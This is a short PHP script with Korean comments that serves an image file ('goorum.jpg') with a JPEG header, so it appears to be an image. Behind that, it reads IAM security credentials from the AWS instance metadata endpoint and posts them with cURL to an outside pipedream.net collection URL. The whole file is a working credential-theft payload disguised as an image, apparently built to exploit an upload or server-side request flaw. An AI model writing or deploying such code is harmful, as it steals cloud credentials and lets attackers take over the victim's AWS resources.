<?php
  header('Content-Type: image/jpeg');
  readfile('./goorum.jpg');

  // AWS 메타데이터 서버에서 IAM 보안 자격증명 가져오기
  $metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
  $credentials = file_get_contents($metadata_url);
  
  // POST 요청을 보낼 대상 URL
  $target_url = "https://enhncv8x0qv59.x.pipedream.net";
  
  // POST 요청을 위한 cURL 초기화
  $ch = curl_init($target_url);
  
  // POST 요청에 필요한 옵션 설정
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_POST, true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $credentials);
  
  // POST 요청 실행
  $response = curl_exec($ch);
  
  // cURL 세션 종료
  curl_close($ch);
?>
